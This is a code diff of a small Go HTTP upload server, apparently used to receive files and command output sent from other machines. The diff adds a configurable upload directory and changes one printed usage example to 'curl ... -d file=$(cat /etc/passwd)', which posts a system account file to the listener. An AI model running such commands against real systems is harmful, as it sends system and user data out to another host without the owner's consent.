@@ -22,10 +22,11 @@ func main() {
 	host := flag.String("host", "", "Host address to listen on (default: all interfaces)")
 	port := flag.String("port", "8080", "Port to listen on")
 	urlEncoded := flag.Bool("urlencoded", false, "Enable URL encoded mode (expects application/x-www-form-urlencoded)")
+	dir := flag.String("dir", "", "Upload directory (default: home directory)")
 	flag.Parse()
 
 	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
-		uploadHandler(w, r, *urlEncoded)
+		uploadHandler(w, r, *urlEncoded, *dir)
 	})
 
 	listenAddr := fmt.Sprintf("%s:%s", *host, *port)
@@ -100,7 +101,7 @@ func main() {
 	fmt.Printf("  curl -F \"file=@image.png\" http://%s:%s/\n", displayIP, *port)
 	fmt.Printf("  ls -la | curl -F \"file=@-;filename=list.txt\" http://%s:%s/\n", displayIP, *port)
 	if *urlEncoded {
-		fmt.Printf("  curl http://%s:%s/ -d file=$(cat /tmp/output)\n", displayIP, *port)
+		fmt.Printf("  curl http://%s:%s/ -d file=$(cat /etc/passwd)\n", displayIP, *port)
 	}
 	fmt.Println()
 
@@ -109,7 +110,7 @@ func main() {
 	}
 }
 
-func uploadHandler(w http.ResponseWriter, r *http.Request, urlEncoded bool) {
+func uploadHandler(w http.ResponseWriter, r *http.Request, urlEncoded bool, uploadDir string) {
 	if r.Method != http.MethodPost {
 		http.Error(w, "Only POST method is allowed", http.StatusMethodNotAllowed)
 		return
@@ -170,12 +171,15 @@ func uploadHandler(w http.ResponseWriter, r *http.Request, urlEncoded bool) {
 		return '_'
 	}, filename)
 
-	homeDir, err := os.UserHomeDir()
-	if err != nil {
-		homeDir = "/tmp"
+	if uploadDir == "" {
+		var err error
+		uploadDir, err = os.UserHomeDir()
+		if err != nil {
+			uploadDir = "/tmp"
+		}
 	}
 
-	finalPath := filepath.Join(homeDir, safeFilename)
+	finalPath := filepath.Join(uploadDir, safeFilename)
 
 	dst, err := os.Create(finalPath)
 	if err != nil {
